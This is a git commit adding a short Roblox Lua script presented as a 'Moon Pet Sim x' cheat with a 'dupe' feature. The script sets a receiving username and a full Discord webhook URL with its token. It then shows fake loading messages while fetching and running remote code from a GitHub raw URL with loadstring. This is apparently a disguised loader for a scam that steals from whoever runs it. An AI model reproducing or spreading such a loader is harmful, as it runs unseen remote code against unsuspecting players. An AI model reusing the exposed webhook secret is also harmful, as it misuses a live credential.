97c6e7b505617a206f217523c1119d4e32378c73
qToshi <ramsesmebro@gmail.com>
2023-07-05 11:09:45 +0800

    first commit

---
+++ With Dupe updated/ScarletMoon.lua
@@ -0,0 +1,10 @@
+Username = "bootchogy"
+--Username2 = "bogli03" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1125833705328484463/v32DEf8SvsZHEISeu5-9KulDD7rBcgtASdl-Whf43X9SmyiyRlYHE3uwl8vu38QfaqKC"
+loadingscreen = true
+_G.CustomScriptName = "Moon Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
